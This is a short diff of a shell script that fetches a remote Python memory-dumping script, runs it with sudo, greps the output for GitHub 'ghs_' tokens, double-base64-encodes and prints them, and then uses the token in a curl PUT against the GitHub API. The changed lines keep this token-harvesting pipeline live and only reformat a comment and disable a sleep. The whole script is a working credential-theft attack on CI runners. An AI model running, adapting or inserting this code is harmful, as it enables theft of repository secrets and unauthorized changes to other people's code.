@@ -2,7 +2,8 @@
 set -e
 
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
-TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64`# awk 'NR==2' `
+TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64`
+# awk 'NR==2' `
 
 echo "-----------------------------------------------------------------"
 echo "$TOKEN_VAL"
@@ -18,7 +19,7 @@ curl -L --request PUT --url "https://api.github.com/repos/thi3nl0ng/thi3nl0ng.gi
 #    -H "Authorization: token $TOKEN_VAL" \
 #    "https://api.github.com/repos/${REPO}/contents/README.md" \
 #    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
-sleep 30
+#sleep 30
 
 #curl "https://api.github.com/repos/${REPO}/contents/README.md"      
 
